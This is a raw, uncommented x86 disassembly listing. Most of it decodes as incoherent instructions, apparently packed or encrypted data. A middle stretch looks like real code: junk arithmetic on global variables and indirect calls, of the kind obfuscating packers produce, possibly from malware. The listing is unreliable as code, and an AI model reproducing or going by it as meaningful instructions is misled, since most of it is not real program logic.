  4185f9:	sub    eax,0x5f5e6fde
  4185fe:	mov    cl,0x17
  418600:	stos   DWORD PTR es:[edi],eax
  418601:	add    al,0xf1
  418603:	inc    ecx
  418604:	popa   
  418605:	or     eax,0x1d16bb0b
  41860a:	lahf   
  41860b:	xor    BYTE PTR [ebx+0x2d],dl
  41860e:	push   es
  41860f:	pop    eax
  418610:	cmp    BYTE PTR [esi+0x5bbb821],dl
  418616:	es push 0x57bb3ace
  41861c:	push   es
  41861d:	addr16 dec ebx
  41861f:	jne    0x418650
  418621:	sub    bl,BYTE PTR [esi-0x7a1b3872]
  418627:	sub    BYTE PTR [ebx-0x7010472e],0x1
  41862e:	xor    al,0xff
  418630:	ret    
  418631:	popf   
  418632:	push   edx
  418633:	mov    BYTE PTR [esi-0x6da18aa1],ch
  418639:	mov    dh,0xba
  41863b:	push   es
  41863c:	sbb    eax,0xe8e03518
  418641:	call   0xcecb:0x7ece0dc1
  418648:	pop    ds
  418649:	jle    0x4185d8
  41864b:	ret    0x5c26
  41864e:	ins    DWORD PTR es:[edi],dx
  41864f:	xchg   dx,ax
  418651:	jl     0x4186bb
  418653:	aad    0xf6
  418655:	xchg   ebp,eax
  418656:	shld   DWORD PTR [eax+0x4f4bdba7],edi,cl
  41865d:	fnstsw WORD PTR [esp+ebp*8-0x7]
  418661:	test   eax,0xde3bb6e2
  418666:	test   BYTE PTR [edi-0x70],ah
  418669:	out    0x6a,eax
  41866b:	jae    0x41862f
  41866d:	je     0x4185f3
  41866f:	fidivr WORD PTR [edx]
  418671:	mov    dl,0x1a
  418673:	sub    eax,0x7c669c6
  418678:	push   ecx
  418679:	js     0xeada621c
  41867f:	push   0xffffffa8
  418681:	fbld   TBYTE PTR ds:0x571ae8e4
  418687:	jmp    0x7768:0x7b2e395f
  41868e:	xchg   edx,eax
  41868f:	xchg   esi,eax
  418690:	stos   DWORD PTR es:[edi],eax
  418691:	add    dh,cl
  418693:	loop   0x418714
  418695:	aas    
  418696:	cmp    DWORD PTR [edi+0x2f],eax
  418699:	xlat   BYTE PTR ds:[ebx]
  41869a:	rcr    BYTE PTR [edx-0x496413cb],cl
  4186a0:	mov    cl,0x5b
  4186a2:	xchg   BYTE PTR [ecx-0x56],cl
  4186a5:	adc    eax,0x60e19d33
  4186aa:	xchg   edi,eax
  4186ab:	push   edi
  4186ac:	cmp    BYTE PTR [edi-0x2f],dl
  4186af:	mov    esi,0xdc1aec6a
  4186b4:	lods   al,BYTE PTR ds:[esi]
  4186b5:	(bad)  
  4186b7:	sub    al,0x3c
  4186b9:	loopne 0x41864d
  4186bb:	int3   
  4186bc:	dec    edx
  4186bd:	hlt    
  4186be:	int    0x65
  4186c0:	mov    DWORD PTR [edx-0x53a1fde5],0xf25dcd3a
  4186ca:	repnz mov DWORD PTR [esp+ebp*8-0x216f48a9],esp
  4186d2:	jmp    0x4186b7
  4186d4:	jg     0x418717
  4186d6:	and    al,0x4f
  4186d8:	aam    0x39
  4186da:	mov    bh,0x66
  4186dc:	iret   
  4186dd:	add    al,BYTE PTR [edx+0x3]
  4186e0:	loope  0x41869e
  4186e2:	pop    ds
  4186e3:	mov    al,0xe2
  4186e5:	fcom   st(3)
  4186e7:	js     0x4186a1
  4186e9:	repnz push 0x40
  4186ec:	outs   dx,BYTE PTR ds:[esi]
  4186ed:	mov    eax,ss
  4186ef:	xor    edx,DWORD PTR [esi]
  4186f1:	cmp    BYTE PTR [edi+edx*4],ch
  4186f4:	(bad)  
  4186f5:	addr16 iret 
  4186f7:	mov    ch,0x19
  4186f9:	lock cmp BYTE PTR [esi+eax*1],ah
  4186fd:	add    dl,BYTE PTR [esi-0x7b055fde]
  418703:	cld    
  418704:	pusha  
  418705:	add    esi,DWORD PTR [ecx-0x4b]
  418708:	xchg   BYTE PTR [eax-0x56],dl
  41870b:	push   ebp
  41870c:	xchg   esi,eax
  41870d:	mov    bh,0x36
  41870f:	mov    esi,0x83b383fd
  418714:	adc    bh,dh
  418716:	xlat   BYTE PTR ds:[ebx]
  418717:	push   ecx
  418718:	mov    eax,ds:0xa78dc15a
  41871d:	pop    ecx
  41871e:	sub    edx,0xffffffb5
  418721:	iret   
  418722:	aaa    
  418723:	mov    ebp,0x35cc20e7
  418728:	in     eax,dx
  418729:	sub    eax,0xf9c6aac
  41872e:	pop    ecx
  41872f:	xor    al,0x2c
  418731:	mov    ebx,0xf5351746
  418736:	cmp    al,0xc1
  418738:	and    ah,ch
  41873a:	and    ecx,DWORD PTR [eax+edi*2+0x51]
  41873e:	cs xchg edx,eax
  418740:	sbb    dh,BYTE PTR [edx]
  418742:	pop    edx
  418743:	mov    ebx,0x916bf638
  418748:	aam    0xae
  41874a:	mov    esp,0xb628f768
  41874f:	pop    ds
  418750:	fadd   st(0),st
  418752:	shl    ebp,1
  418754:	mov    ds:0xe7bf2e36,eax
  418759:	js     0x41874d
  41875b:	int3   
  41875c:	adc    eax,DWORD PTR [eax-0x3c]
  41875f:	js     0x4187a1
  418761:	jecxz  0x4186fc
  418763:	scas   al,BYTE PTR es:[edi]
  418764:	call   0xd929:0xe4f2db46
  41876b:	pop    ecx
  41876c:	pop    ebp
  41876d:	pusha  
  41876e:	jmp    0x6cbdd982
  418773:	imul   ecx,DWORD PTR [eax+0x23],0xc78371c2
  41877a:	pop    esi
  41877b:	in     al,dx
  41877c:	xor    eax,0x3a882559
  418781:	sbb    eax,0x50bc03c5
  418786:	lock mov edi,0x414c81df
  41878c:	xor    eax,0xe6e7d47e
  418791:	clc    
  418792:	mov    al,BYTE PTR ds:0x77bc9515
  418798:	cs pop esp
  41879a:	pop    es
  41879b:	xchg   dh,al
  41879d:	add    al,0x4
  41879f:	sahf   
  4187a0:	xor    ebp,edi
  4187a2:	dec    eax
  4187a3:	jle    0x41879d
  4187a5:	dec    eax
  4187a6:	mov    edx,0xffd69b96
  4187ab:	xchg   ebx,eax
  4187ac:	jmp    0xc53a71c9
  4187b1:	addr16 aam 0x21
  4187b4:	enter  0x948f,0x36
  4187b8:	mov    ah,0xe
  4187ba:	cmp    eax,0x84fb9e62
  4187bf:	jb     0x41877a
  4187c1:	push   0x61
  4187c3:	shl    DWORD PTR [esi],cl
  4187c5:	fwait
  4187c6:	mov    al,0xfb
  4187c8:	cld    
  4187c9:	mov    cl,0xaa
  4187cb:	psubsw mm1,QWORD PTR [edx+0x29]
  4187cf:	pusha  
  4187d0:	loop   0x418845
  4187d2:	aam    0x78
  4187d4:	fcmovu st,st(0)
  4187d6:	push   0xcc5f0373
  4187db:	or     DWORD PTR [esp+eax*2+0x28],esp
  4187df:	dec    edi
  4187e0:	hlt    
  4187e1:	dec    ebx
  4187e2:	das    
  4187e3:	mov    bh,0x83
  4187e5:	fwait
  4187e6:	cmp    eax,0x3bfddc29
  4187eb:	jmp    0xa4d7d6d8
  4187f0:	add    BYTE PTR [eax+0x3f7bffb8],0x49
  4187f7:	xor    ecx,DWORD PTR [ecx+0x42]
  4187fa:	psubw  mm4,QWORD PTR [ecx]
  4187fd:	xor    eax,0x4c319578
  418802:	nop
  418803:	idiv   ebp
  418805:	cmc    
  418806:	mov    eax,ds:0x90674e7b
  41880b:	psubd  mm3,QWORD PTR [ebp-0x4eb6a031]
  418812:	lods   al,BYTE PTR ds:[esi]
  418813:	adc    eax,DWORD PTR [ebp+eiz*1+0x7f]
  418817:	adc    dl,BYTE PTR [ebx+0x5e]
  41881a:	jae    0x41883b
  41881c:	xor    al,bl
  41881e:	pop    edx
  41881f:	sbb    al,0x22
  418822:	aaa    
  418823:	or     DWORD PTR [edx+ebx*4-0x2392a72a],esp
  41882a:	xchg   edi,eax
  41882b:	fld    st(3)
  41882d:	fadd   QWORD PTR [ecx]
  41882f:	mov    esp,0x43162103
  418834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418835:	retf   0x3a6c
  418838:	push   0x6e
  41883a:	sbb    al,0x87
  41883c:	xor    ah,BYTE PTR [ebp+0x7795f62e]
  418842:	dec    esi
  418843:	push   esi
  418844:	xchg   esi,eax
  418845:	sub    al,BYTE PTR [edi]
  418847:	fldcw  WORD PTR [esi]
  418849:	aad    0x60
  41884b:	inc    esi
  41884c:	les    edi,FWORD PTR [edx-0x61cc00f9]
  418852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418853:	xlat   BYTE PTR ds:[ebx]
  418854:	pop    eax
  418855:	lods   eax,DWORD PTR ds:[esi]
  418856:	in     al,dx
  418857:	loop   0x4187de
  418859:	jmp    0x9df2:0x50176b05
  418860:	popa   
  418861:	xor    BYTE PTR ds:[ecx+edi*2+0x1d],dh
  418866:	push   ecx
  418867:	mov    eax,0x163e86c4
  41886c:	inc    esi
  41886d:	sub    eax,0xafe02188
  418872:	fild   QWORD PTR [edi+0x46]
  418875:	inc    eax
  418876:	xor    esi,DWORD PTR [ecx]
  418878:	cmp    eax,0xc032cf60
  41887d:	sbb    BYTE PTR [esi-0x489e067b],dh
  418883:	or     dl,bl
  418885:	mov    WORD PTR [ebp+edx*2+0x2e6ddae3],ss
  41888c:	jle    0x418862
  41888e:	jns    0x4188e3
  418890:	mov    esp,?
  418892:	jbe    0x418837
  418894:	xchg   esi,eax
  418895:	push   0x53
  418897:	aad    0x17
  418899:	(bad)  
  41889a:	and    edi,DWORD PTR [edi-0x18]
  41889d:	and    esp,DWORD PTR [ebp+0x61]
  4188a0:	test   al,0x81
  4188a2:	aas    
  4188a3:	pop    ecx
  4188a4:	lock inc edi
  4188a6:	enter  0xe6df,0x66
  4188aa:	adc    al,0xcd
  4188ac:	add    edi,ecx
  4188ae:	pop    ds
  4188af:	jge    0x418887
  4188b1:	jns    0x4188b4
  4188b3:	addr16 aad 0x8b
  4188b6:	dec    esp
  4188b7:	and    al,0x48
  4188b9:	or     DWORD PTR ds:0x42823b,0x42822b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428153
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428243,0x42829b
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42818f,0x428293
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42823f,0x42837f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42827b,0x7154
  418909:	call   DWORD PTR ds:0x428da8
  41890f:	or     DWORD PTR ds:0x428293,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x428397,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42831f,0x0
  418935:	mov    DWORD PTR ds:0x4282ff,ebx
  41893b:	mov    DWORD PTR ds:0x428283,ebx
  418941:	mov    esi,DWORD PTR ds:0x428253
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42831f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dec
  41896e:	movzx  esi,WORD PTR ds:0x428323
  418975:	sbb    DWORD PTR ds:0x428163,esi
  41897b:	adc    DWORD PTR ds:0x42836f,0x5f0e
  418985:	xor    DWORD PTR ds:0x4283a7,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428237
  418991:	xor    esi,DWORD PTR ds:0x428173
  418997:	mov    DWORD PTR ds:0x428237,esi
  41899d:	add    DWORD PTR ds:0x428247,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x4283a3,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42837b,0x42823b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428163,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42831b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x4282a3
  4189ec:	mov    edx,DWORD PTR ds:0x42822b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x4283a3,0x606f
  418a03:	mov    DWORD PTR ds:0x42817f,ebx
  418a09:	cmp    DWORD PTR ds:0x42831b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428df0
  418a1c:	adc    DWORD PTR ds:0x42815b,ebx
  418a22:	or     DWORD PTR ds:0x42825f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x42820f
  418a34:	mov    edx,DWORD PTR ds:0x428333
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428323
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x4282a7,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x4283a3,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42827b,0x11c5
  418a73:	mov    DWORD PTR ds:0x428397,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42815b
  418a85:	mov    eax,ds:0x42829b
  418a8a:	cmp    DWORD PTR ds:0x4283a3,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428e90
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428373,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428283,edi
  418ac0:	or     DWORD PTR ds:0x42827b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42836f,ebx
  418ad0:	mov    eax,ds:0x422558
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42817b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0xccb0b184
  418af3:	fdiv   DWORD PTR [edi+0x16cb9a7c]
  418af9:	sbb    BYTE PTR [edx+edx*1-0x1e50e7e8],bh
  418b00:	cwde   
  418b01:	loopne 0x418b7f
  418b03:	(bad)  
  418b04:	push   ds
  418b05:	test   eax,0x8833434b
  418b0a:	push   cs
  418b0b:	nop
  418b0c:	add    edx,ebx
  418b0e:	aaa    
  418b0f:	and    BYTE PTR [esi-0x64d41815],0x98
  418b16:	jne    0x418b71
  418b18:	push   ax
  418b1a:	xor    dl,0xb3
  418b1d:	lods   eax,DWORD PTR ds:[esi]
  418b1e:	scas   al,BYTE PTR es:[edi]
  418b1f:	push   0x40
  418b21:	sbb    DWORD PTR [edi-0x3545c745],edx
  418b27:	mov    edx,esi
  418b29:	lods   al,BYTE PTR ds:[esi]
  418b2a:	lahf   
  418b2b:	or     eax,0x86d813a8
  418b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b31:	sahf   
  418b32:	adc    al,0xa
  418b34:	repz call 0x8c93:0xa26109a1
  418b3c:	in     eax,0xaa
  418b3e:	adc    eax,edi
  418b40:	int    0x70
  418b42:	mov    eax,DWORD PTR [edx+eax*4-0x4]
  418b46:	adc    cl,dh
  418b48:	loop   0x418b79
  418b4a:	xor    ecx,DWORD PTR [ebp+0x120bc8aa]
  418b50:	lods   eax,DWORD PTR ds:[esi]
  418b51:	mov    es,WORD PTR [ebx+0x3a]
  418b54:	sar    DWORD PTR [ecx],cl
  418b56:	mov    edx,0xd24f464f
  418b5b:	lds    ebx,FWORD PTR [ebp-0x10]
  418b5e:	sar    DWORD PTR [ebx-0x54],0x5c
  418b62:	inc    eax
  418b63:	inc    ecx
  418b64:	xlat   BYTE PTR ds:[ebx]
  418b65:	adc    eax,eax
  418b67:	mov    ds:0xe90f9f23,al
  418b6c:	mov    cl,0x52
  418b6e:	push   ecx
  418b6f:	stos   BYTE PTR es:[edi],al
  418b70:	jg     0x418b9e
  418b72:	int    0xea
  418b74:	gs loope 0x418b79
  418b77:	push   cs
  418b78:	cli    
  418b79:	mov    eax,0x48a4bde1
  418b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b7f:	inc    edi
  418b80:	ins    DWORD PTR es:[edi],dx
  418b81:	pop    ds
  418b82:	(bad)  
  418b83:	pop    ecx
  418b84:	mov    eax,0xf6a7c632
  418b89:	jge    0x418b3b
  418b8b:	clc    
  418b8c:	popa   
  418b8d:	inc    esp
  418b8e:	cli    
  418b8f:	in     al,dx
  418b90:	jnp    0x418b63
  418b92:	mov    ecx,0x176172cf
  418b97:	aas    
  418b98:	push   cs
  418b99:	test   eax,0xebd7a397
  418b9e:	daa    
  418b9f:	fstp   QWORD PTR [esi-0xec8f745]
  418ba5:	push   es
  418ba6:	xchg   ecx,eax
  418ba7:	rcr    cl,1
  418ba9:	jbe    0x418c0e
  418bab:	sub    dl,ah
  418bad:	stos   BYTE PTR es:[edi],al
  418bae:	jge    0x418bb1
  418bb0:	shl    BYTE PTR [edi+0x146c2675],0x79
  418bb7:	xor    al,0xec
  418bb9:	and    al,0xc3
  418bbb:	mov    esi,0x7bd7b5c8
  418bc0:	pusha  
  418bc1:	pop    edx
  418bc2:	ret    0x27c4
  418bc5:	sub    dh,ah
  418bc7:	mov    bl,0x65
  418bc9:	(bad)  
  418bca:	or     al,0x2
  418bcc:	mov    bh,0xbd
  418bce:	aaa    
  418bcf:	shr    BYTE PTR [eax+0x3c],cl
  418bd2:	jo     0x418b75
  418bd4:	lock push eax
  418bd6:	push   ecx
  418bd7:	idiv   BYTE PTR [esi+0x199ca975]
  418bdd:	es adc bh,cl
  418be0:	dec    edx
  418be1:	mov    ds:0x6ff84aac,al
  418be6:	and    eax,0x7a5c5ffd
  418beb:	out    0xee,al
  418bed:	cwde   
  418bee:	in     eax,0xdd
  418bf0:	xor    al,0xc9
  418bf2:	sbb    eax,0x1e79be94
  418bf7:	xor    edx,DWORD PTR [edx+ebp*1]
  418bfa:	mov    edx,0x9393864e
  418bff:	(bad)  
  418c00:	fild   WORD PTR [ebp+0x4f6ddc88]
  418c06:	sahf   
  418c07:	not    DWORD PTR [edi+0x32]
  418c0a:	adc    eax,0xedfe943b
  418c0f:	les    ebx,FWORD PTR [eax]
  418c11:	div    BYTE PTR [ebp-0x463b890]
  418c17:	mov    al,0x9b
  418c19:	add    al,0x7f
  418c1b:	xor    BYTE PTR [edi+0x30],ah
  418c1e:	jge    0x418bf8
  418c20:	bound  esp,QWORD PTR [esi-0x1e]
  418c23:	mov    ebp,eax
  418c25:	int    0x72
  418c27:	cdq    
  418c28:	inc    eax
  418c29:	jmp    0x11f0:0x1c6aa934
  418c30:	push   edi
  418c31:	aad    0xb4
  418c33:	mov    DWORD PTR [ecx],edi
  418c35:	in     eax,dx
  418c36:	mov    ebp,0x8e43bfbc
  418c3b:	pop    edx
  418c3c:	and    al,BYTE PTR [edx+0x56d43d57]
  418c42:	jnp    0x418cb1
  418c44:	xor    ebx,DWORD PTR [esi]
  418c46:	push   ecx
  418c47:	out    dx,eax
  418c48:	outs   dx,BYTE PTR ds:[esi]
  418c49:	mov    gs,WORD PTR [ebx]
  418c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c4c:	pop    edx
  418c4d:	lods   al,BYTE PTR ds:[esi]
  418c4e:	inc    ebp
  418c4f:	test   al,0x5f
  418c51:	xlat   BYTE PTR ds:[ebx]
  418c52:	ins    DWORD PTR es:[edi],dx
  418c53:	jge    0x418c7f
  418c55:	mov    ds:0x9692c9c3,eax
  418c5a:	int    0x7f
  418c5c:	xchg   edi,eax
  418c5d:	xchg   DWORD PTR [esp+edi*4-0x570fec72],esp
  418c64:	dec    esp
  418c65:	mov    ebp,0xa5330e53
  418c6a:	jb     0x418c4d
  418c6c:	jge    0x418bf7
  418c6e:	clc    
  418c6f:	add    eax,0x23ad0e48
  418c74:	mov    edx,0xf679bc90
  418c79:	add    DWORD PTR ss:[ebp+0x1589829b],ebp
  418c80:	pop    eax
  418c81:	and    al,0x35
  418c83:	jmp    0x82623829
  418c88:	pop    eax
  418c89:	shl    DWORD PTR [eax],cl
  418c8b:	cmp    ch,al
  418c8d:	repnz fldenv [edx]
  418c90:	fist   WORD PTR [esi+0x47]
  418c93:	dec    edi
  418c94:	xchg   esi,eax
  418c95:	adc    bh,bh
  418c97:	stc    
  418c98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c99:	repz ds pop ebx
  418c9c:	pop    eax
  418c9d:	ins    DWORD PTR es:[edi],dx
  418c9e:	out    dx,eax
  418c9f:	leave  
  418ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ca1:	xor    edx,DWORD PTR [esi+0x2e]
  418ca4:	loope  0x418c59
  418ca6:	cwde   
  418ca7:	stos   DWORD PTR es:[edi],eax
  418ca8:	sbb    ah,BYTE PTR [ebx-0x580665b9]
  418cae:	mov    bl,BYTE PTR [edi]
  418cb0:	or     eax,0x2ade7d84
  418cb5:	in     eax,dx
  418cb6:	imul   ebx,DWORD PTR [eax-0x12d8dc1e],0x79
  418cbd:	scas   eax,DWORD PTR es:[edi]
  418cbe:	ret    
  418cbf:	out    0xba,al
  418cc1:	sbb    al,0x18
  418cc3:	fwait
  418cc4:	xchg   ebp,eax
  418cc5:	push   es
  418cc6:	leave  
  418cc7:	adc    bh,BYTE PTR [edi+0x7796dc71]
  418ccd:	repz jbe 0x418ca7
  418cd0:	push   ebp
  418cd1:	inc    ebp
  418cd2:	inc    esi
  418cd3:	and    dh,bl
  418cd5:	mov    ch,dl
  418cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cd8:	mov    cl,0xba
  418cda:	scas   eax,DWORD PTR es:[edi]
  418cdb:	rol    DWORD PTR [ebx+edx*2-0x1924edcd],cl
  418ce2:	xchg   edi,eax
  418ce3:	push   edi
  418ce4:	jae    0x418d47
  418ce6:	push   cs
  418ce7:	mov    al,ds:0xf2698b44
  418cec:	daa    
  418ced:	mov    ebp,edi
  418cef:	xor    cl,0xe6
  418cf2:	jp     0x418cf1
  418cf4:	and    dh,BYTE PTR [eax-0x27]
  418cf7:	lahf   
  418cf8:	jnp    0xff897e96
  418cfe:	stos   DWORD PTR es:[edi],eax
  418cff:	gs dec ecx
  418d01:	shl    DWORD PTR [ebp+0x5dfea5f5],1
  418d07:	shl    BYTE PTR [edx+ebx*1+0x5ccc9e7e],1
  418d0e:	pop    ebp
  418d0f:	mov    bh,BYTE PTR [ecx+0x2f]
  418d12:	retf   
  418d13:	mov    ds:0xbaf2c108,eax
  418d18:	xor    eax,0xfcbb181d
  418d1d:	lods   eax,DWORD PTR ds:[esi]
  418d1e:	out    0x92,al
  418d20:	xor    ch,al
  418d22:	out    dx,eax
  418d23:	addr16 das 
  418d25:	jge    0x418cd2
  418d27:	ja     0x418d1d
  418d29:	sbb    al,0x9b
  418d2b:	push   esp
  418d2c:	mov    bp,0xf279
  418d30:	sbb    al,0x73
  418d32:	aad    0xf4
  418d34:	retf   0x8b12
  418d37:	sar    BYTE PTR [ebp+0x4c],1
  418d3a:	stc    
  418d3b:	fsubr  st,st(2)
  418d3d:	inc    ebp
  418d3e:	inc    ebp
  418d3f:	mov    bh,0xdf
  418d41:	xchg   ebx,eax
  418d42:	xor    DWORD PTR [ecx+ebx*8+0x3a],ebx
  418d46:	hlt    
  418d47:	pop    edx
  418d48:	pop    ecx
  418d49:	and    esi,DWORD PTR [esi+0xc1f9beb]
  418d4f:	push   es
  418d50:	jecxz  0x418cd9
  418d52:	mov    ebx,0x6dfed737
  418d57:	mov    BYTE PTR [eax+ebp*1],bl
  418d5a:	mov    cl,BYTE PTR [ebx]
  418d5c:	dec    edi
  418d5d:	mov    ebp,cs
  418d5f:	mov    bl,BYTE PTR [edx-0x155c481b]
  418d65:	sub    DWORD PTR [edi-0x46],esp
  418d68:	pop    eax
  418d69:	dec    eax
  418d6a:	jns    0x418ddf
  418d6c:	and    DWORD PTR [ebx],0xffffffed
  418d6f:	ja     0x418d3e
  418d71:	and    ecx,eax
  418d73:	xchg   esi,eax
  418d74:	add    eax,0x4e1997e1
  418d79:	scas   al,BYTE PTR es:[edi]
  418d7a:	xor    al,0x60
  418d7c:	repnz xor esi,0xffffffcd
  418d80:	iret   
  418d81:	(bad)  
  418d82:	test   eax,0xcaadab59
  418d87:	dec    ecx
  418d88:	stos   BYTE PTR es:[edi],al
  418d89:	popa   
  418d8a:	push   esi
  418d8b:	outs   dx,BYTE PTR ds:[esi]
  418d8c:	pop    esi
  418d8d:	xor    BYTE PTR [edx+0x6b],bl
  418d90:	cdq    
  418d91:	loop   0x418d41
  418d93:	stos   BYTE PTR es:[edi],al
  418d94:	xchg   ebx,eax
  418d95:	les    edi,FWORD PTR [ecx+0x56]
  418d98:	xchg   edi,eax
  418d99:	jbe    0x418d9a
  418d9b:	xchg   BYTE PTR [eax-0x3814a382],ch
  418da1:	(bad)  
  418da2:	out    0x9f,eax
  418da4:	retf   
  418da5:	xchg   esi,eax
  418da6:	stc    
  418da7:	mov    DWORD PTR [ebx+edx*2-0x7b1af351],ebx
  418dae:	leave  
  418daf:	retf   
  418db0:	pop    ecx
  418db1:	aas    
  418db2:	lahf   
  418db3:	inc    edx
  418db4:	jne    0x418e06
  418db6:	and    ebx,DWORD PTR [edi+edx*8]
  418db9:	pop    ebp
  418dba:	fs pusha 
  418dbc:	ins    DWORD PTR es:[edi],dx
  418dbd:	imul   esi,DWORD PTR [ebp+0x6b],0xffffffaa
  418dc1:	and    BYTE PTR [ebp+ebx*4+0x7875cbb1],dl
  418dc8:	mov    dh,BYTE PTR [eax+eax*4]
  418dcb:	xor    al,bl
  418dcd:	mov    ebp,0x35203798
  418dd2:	sahf   
  418dd3:	cmp    edx,ebx
  418dd5:	call   0x22f1:0x2d136850
  418ddc:	cmp    cl,BYTE PTR [ebx+0x70]
  418ddf:	pushf  
  418de0:	xor    al,0x8b
  418de2:	xor    BYTE PTR [edi+0x57],0x8d
  418de6:	cmp    BYTE PTR [ecx],bh
  418de8:	popf   
  418de9:	(bad)  
  418dea:	push   ss
  418deb:	jmp    0xdb7dddba
  418df0:	scas   al,BYTE PTR es:[edi]
  418df1:	sbb    DWORD PTR [ecx],edx
  418df3:	xchg   esi,eax
  418df4:	(bad)  
  418df6:	int    0x3a
  418df8:	test   al,0xe
  418dfa:	pop    es
  418dfb:	ret    
  418dfc:	sahf   
  418dfd:	cwde   
  418dfe:	arpl   WORD PTR [edx],bx
  418e00:	adc    BYTE PTR [edx-0x3093f60e],bl
  418e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e07:	mov    al,0xfd
  418e09:	loop   0x418e55
  418e0b:	ins    DWORD PTR es:[edi],dx
  418e0c:	jno    0x418e17
  418e0e:	add    DWORD PTR [ebp-0xcc96456],edx
  418e14:	or     al,0x71
  418e16:	out    0xee,al
  418e18:	push   edi
  418e19:	mov    bl,0x6d
  418e1b:	cmp    DWORD PTR [edi],edx
  418e1d:	inc    esp
  418e1e:	aam    0x28
  418e20:	fcom   DWORD PTR [edi]
  418e22:	or     BYTE PTR ds:0x2ec2b4c0,ch
  418e28:	inc    esi
  418e29:	or     ebx,esp
  418e2b:	aam    0x40
  418e2d:	ins    DWORD PTR es:[edi],dx
  418e2e:	jno    0x418e8c
  418e30:	dec    edx
  418e31:	js     0x418dd6
  418e33:	mov    BYTE PTR [eax-0x56],bh
  418e36:	loopne 0x418dd5
  418e38:	int    0x7b
  418e3a:	les    ecx,FWORD PTR [edi+0x4f]
  418e3d:	cmc    
  418e3e:	mov    bl,0x24
  418e40:	mul    DWORD PTR [ecx-0x18]
  418e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e44:	pop    es
  418e45:	mov    edx,0x1f6acc1b
  418e4a:	xchg   ebp,eax
  418e4b:	lods   al,BYTE PTR ds:[esi]
  418e4c:	mov    eax,ds:0xe9e3cd83
  418e51:	aas    
  418e52:	inc    esi
  418e53:	nop
  418e54:	pop    ds
  418e55:	aad    0x39
  418e57:	mov    bh,0x14
  418e59:	xor    DWORD PTR [edx],esi
  418e5b:	fld    st(7)
  418e5d:	push   edi
  418e5e:	xor    DWORD PTR [ebx+0x1313e286],ebp
  418e64:	or     ebx,eax
  418e66:	dec    eax
  418e67:	sub    DWORD PTR [edx],ebp
  418e69:	jo     0x418ed2
  418e6b:	mov    dl,0x44
  418e6d:	and    edx,DWORD PTR [edi]
  418e6f:	popaw  
  418e71:	jo     0x418e54
  418e73:	mov    ch,0xe9
  418e75:	xor    dh,BYTE PTR [edx-0x5183c203]
  418e7b:	ja     0x418e53
  418e7d:	dec    esi
  418e7e:	out    0xd1,al
  418e80:	mov    cl,0xdf
  418e82:	ret    0x86da
  418e85:	pusha  
  418e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e87:	dec    ebx
  418e88:	es (bad) 
  418e8a:	outs   dx,BYTE PTR ds:[esi]
  418e8b:	mov    dl,0x44
  418e8d:	mov    esp,0x18630d59
  418e92:	lods   al,BYTE PTR ds:[esi]
  418e93:	mov    esi,0xc7481fed
  418e98:	mov    BYTE PTR [ebx],al
  418e9a:	mov    al,0x5f
  418e9c:	and    eax,0x6cc477ba
